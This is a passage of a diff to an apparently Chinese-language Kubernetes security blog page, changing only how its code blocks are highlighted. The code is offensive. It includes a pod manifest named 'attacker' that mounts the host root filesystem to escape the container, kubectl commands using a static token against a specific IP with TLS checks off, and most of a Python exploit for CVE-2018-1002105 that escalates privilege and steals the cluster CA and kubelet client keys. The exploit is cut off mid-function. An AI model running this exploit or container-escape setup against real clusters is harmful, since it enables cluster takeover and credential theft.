+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">imagePullPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">IfNotPresent</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Just spin &amp; wait forever</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">serviceAccount</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">serviceAccountName</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>test-csv，用户 test 的认证凭证。<code>Token, 用户名, UID, 用户组</code></li>
@@ -982,8 +982,8 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">password,test,test,test
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password,test,test,test
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>分别应用上述 yaml：<code>kubectl apply -f xxx</code></p>
 <p>配置用户认证：</p>
@@ -992,8 +992,8 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cp test-csv.csv /etc/kubernetes/pki/test-role-token.csv
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp test-csv.csv /etc/kubernetes/pki/test-role-token.csv
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>修改 API Server 配置文件 <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code></p>
 <p><img
@@ -1029,10 +1029,10 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl --token<span class="o">=</span>password --server<span class="o">=</span>https://129.226.12.58:6443 --insecure-skip-tls-verify <span class="nb">exec</span> -it <span class="nb">test</span> -n vul /bin/hostname
-
-kubectl --token<span class="o">=</span>password --server<span class="o">=</span>https://129.226.12.58:6443 --insecure-skip-tls-verify get pods -n kube-system
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --token<span class="o">=</span>password --server<span class="o">=</span>https://129.226.12.58:6443 --insecure-skip-tls-verify <span class="nb">exec</span> -it <span class="nb">test</span> -n vul /bin/hostname
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kubectl --token<span class="o">=</span>password --server<span class="o">=</span>https://129.226.12.58:6443 --insecure-skip-tls-verify get pods -n kube-system
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -1068,27 +1068,27 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># attacker.yaml</span><span class="w">
-</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">attacker</span><span class="w">
-</span><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
-</span><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
-</span><span class="w">    </span><span class="nt">imagePullPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">IfNotPresent</span><span class="w">
-</span><span class="w">    </span><span class="c"># Just spin &amp; wait forever</span><span class="w">
-</span><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
-</span><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
-</span><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
-</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">escape-host</span><span class="w">
-</span><span class="w">      </span><span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host-escape-door</span><span class="w">
-</span><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
-</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">escape-host</span><span class="w">
-</span><span class="w">      </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
-</span><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c"># attacker.yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">attacker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">imagePullPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">IfNotPresent</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Just spin &amp; wait forever</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">escape-host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host-escape-door</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">escape-host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>思路：</p>
 <ol>
@@ -1305,207 +1305,207 @@ kubectl --token<span class="o">=</span>password --server<span class="o">=</span>
 </span><span class="lnt">200
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34;ExP for CVE-2018-1002105
-</span><span class="s2">ONLY USED FOR SECURITY RESEARCH
-</span><span class="s2">ILLEGAL USE IS **PROHIBITED**
-</span><span class="s2">&#34;&#34;&#34;</span>
-
-<span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">base64</span><span class="p">,</span> <span class="n">token_bytes</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">argparse</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">import</span> <span class="nn">ssl</span>
-<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
-<span class="kn">import</span> <span class="nn">json</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="kn">from</span> <span class="nn">http_parser.parser</span> <span class="kn">import</span> <span class="n">HttpParser</span>
-<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
-    <span class="kn">from</span> <span class="nn">http_parser.pyparser</span> <span class="kn">import</span> <span class="n">HttpParser</span>
-
-<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">Purpose</span><span class="o">.</span><span class="n">CLIENT_AUTH</span><span class="p">)</span>
-
-<span class="c1"># Args</span>
-<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;ExP for CVE-2018-1002105.&#39;</span><span class="p">)</span>
-<span class="n">required</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_argument_group</span><span class="p">(</span><span class="s1">&#39;required arguments&#39;</span><span class="p">)</span>
-<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
-                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;API Server</span><span class="se">\&#39;</span><span class="s1">s IP&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
-                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;API Server</span><span class="se">\&#39;</span><span class="s1">s port&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--bearer-token&#39;</span><span class="p">,</span> <span class="s1">&#39;-b&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
-                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Bearer token for the low privileged user&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--namespace&#39;</span><span class="p">,</span> <span class="s1">&#39;-n&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;namespace&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
-                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Namespace with method access&#39;</span><span class="p">,</span>
-                      <span class="n">default</span><span class="o">=</span><span class="s1">&#39;default&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--pod&#39;</span><span class="p">,</span> <span class="s1">&#39;-P&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;pod&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
-                      <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Pod with method access&#39;</span><span class="p">)</span>
-<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
-
-<span class="c1"># HTTP Gadgets</span>
-<span class="n">http_delimiter</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
-<span class="n">host_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Host: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
-<span class="n">auth_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Authorization: Bearer </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span>
-<span class="n">conn_header</span> <span class="o">=</span> <span class="s1">&#39;Connection: upgrade&#39;</span>
-<span class="n">upgrade_header</span> <span class="o">=</span> <span class="s1">&#39;Upgrade: websocket&#39;</span>
-<span class="n">agent_header</span> <span class="o">=</span> <span class="s1">&#39;User-Agent: curl/7.64.1&#39;</span>
-<span class="n">accept_header</span> <span class="o">=</span> <span class="s1">&#39;Accept: */*&#39;</span>
-<span class="n">origin_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Origin: http://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
-<span class="n">sec_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">token_bytes</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">sec_websocket_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Sec-WebSocket-Key: </span><span class="si">{</span><span class="n">sec_key</span><span class="si">}</span><span class="s1">&#39;</span>
-<span class="n">sec_websocket_version</span> <span class="o">=</span> <span class="s1">&#39;Sec-WebSocket-Version: 13&#39;</span>
-
-<span class="c1"># secret targets</span>
-<span class="n">ca_crt</span> <span class="o">=</span> <span class="s1">&#39;ca.crt&#39;</span>
-<span class="n">client_crt</span> <span class="o">=</span> <span class="s1">&#39;apiserver-kubelet-client.crt&#39;</span>
-<span class="n">client_key</span> <span class="o">=</span> <span class="s1">&#39;apiserver-kubelet-client.key&#39;</span>
-
-
-<span class="k">def</span> <span class="nf">_get_http_body</span><span class="p">(</span><span class="n">byte_http</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">HttpParser</span><span class="p">()</span>
-    <span class="n">recved</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_http</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">byte_http</span><span class="p">,</span> <span class="n">recved</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv_body</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">4096</span><span class="p">):</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
-    <span class="n">incoming</span> <span class="o">=</span> <span class="kc">True</span>
-    <span class="k">while</span> <span class="n">incoming</span><span class="p">:</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">res</span> <span class="o">+=</span> <span class="n">ssock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
-        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
-            <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
-                <span class="k">continue</span>
-            <span class="k">else</span><span class="p">:</span>
-                <span class="k">break</span>
-    <span class="k">return</span> <span class="n">res</span>
-
-
-<span class="k">def</span> <span class="nf">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="p">):</span>
-    <span class="n">payload1</span> <span class="o">=</span> <span class="n">http_delimiter</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
-        <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;GET /api/v1/namespaces/</span><span class="si">{</span><span class="n">namespace</span><span class="si">}</span><span class="s1">/pods/</span><span class="si">{</span><span class="n">pod</span><span class="si">}</span><span class="s1">/exec HTTP/1.1&#39;</span><span class="p">,</span>
-         <span class="n">host_header</span><span class="p">,</span>
-         <span class="n">auth_header</span><span class="p">,</span>
-         <span class="n">upgrade_header</span><span class="p">,</span>
-         <span class="n">conn_header</span><span class="p">))</span>
-    <span class="n">payload1</span> <span class="o">+=</span> <span class="n">http_delimiter</span> <span class="o">*</span> <span class="mi">2</span>
-    <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-
-
-<span class="k">def</span> <span class="nf">_run_with_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">get_path</span><span class="p">):</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">http_delimiter</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
-        <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;GET </span><span class="si">{</span><span class="n">get_path</span><span class="si">}</span><span class="s1"> HTTP/1.1&#39;</span><span class="p">,</span>
-         <span class="n">host_header</span><span class="p">,</span>
-         <span class="n">auth_header</span><span class="p">,</span>
-         <span class="n">conn_header</span><span class="p">,</span>
-         <span class="n">upgrade_header</span><span class="p">,</span>
-         <span class="n">origin_header</span><span class="p">,</span>
-         <span class="n">sec_websocket_key</span><span class="p">,</span>
-         <span class="n">sec_websocket_version</span><span class="p">))</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">http_delimiter</span> <span class="o">*</span> <span class="mi">2</span>
-    <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-
-
-<span class="k">def</span> <span class="nf">_match_or_exit</span><span class="p">(</span><span class="n">banner_bytes</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">fail_message</span><span class="o">=</span><span class="s2">&#34;[-] Failed.&#34;</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">banner_bytes</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
-        <span class="k">return</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">fail_message</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">_get_secret</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
-    <span class="n">delimiter</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;-----&#39;</span>
-    <span class="n">start</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>
-    <span class="n">end</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">rindex</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">end</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">_save_file</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">_steal_secret</span><span class="p">(</span><span class="n">api_server</span><span class="p">,</span> <span class="n">secret_file</span><span class="p">,</span> <span class="n">match_banner</span><span class="p">):</span>
-    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
-        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
-            <span class="n">ssock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Creating new privileged pipe...&#39;</span><span class="p">)</span>
-            <span class="n">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">pod</span><span class="p">)</span>
-            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
-            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stdin, stdout, stderr&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Trying to steal </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
-            <span class="n">cmd1</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
-            <span class="n">cmd2</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/etc/kubernetes/pki/</span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-            <span class="n">_run_with_privilege</span><span class="p">(</span>
-                <span class="n">ssock</span><span class="p">,</span>
-                <span class="sa">f</span><span class="s1">&#39;/exec/kube-system/</span><span class="si">{</span><span class="n">api_server</span><span class="si">}</span><span class="s1">/kube-apiserver?command=</span><span class="si">{</span><span class="n">cmd1</span><span class="si">}</span><span class="s1">&amp;command=</span><span class="si">{</span><span class="n">cmd2</span><span class="si">}</span><span class="s1">&amp;input=1&amp;output=1&amp;tty=0&#39;</span><span class="p">)</span>
-            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
-            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;HTTP/1.1 101 Switching Protocols&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
-            <span class="n">_match_or_exit</span><span class="p">(</span><span class="n">match_banner</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">fail_message</span><span class="o">=</span><span class="sa">f</span><span class="s1">&#39;[-] Cannot find banner </span><span class="si">{</span><span class="n">match_banner</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Got </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">)</span>
-            <span class="n">secret_content</span> <span class="o">=</span> <span class="n">_get_secret</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
-            <span class="n">_save_file</span><span class="p">(</span><span class="n">secret_file</span><span class="p">,</span> <span class="n">secret_content</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Secret </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s1"> saved :)&#39;</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Exploiting CVE-2018-1002105...&#34;</span><span class="p">)</span>
-    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
-        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
-            <span class="c1"># step 1</span>
-            <span class="n">ssock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Checking vulnerable or not...&#34;</span><span class="p">)</span>
-            <span class="n">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">pod</span><span class="p">)</span>
-            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
-            <span class="n">_match_or_exit</span><span class="p">(</span>
-                <span class="sa">b</span><span class="s1">&#39;stdin, stdout, stderr&#39;</span><span class="p">,</span>
-                <span class="n">resp</span><span class="p">,</span>
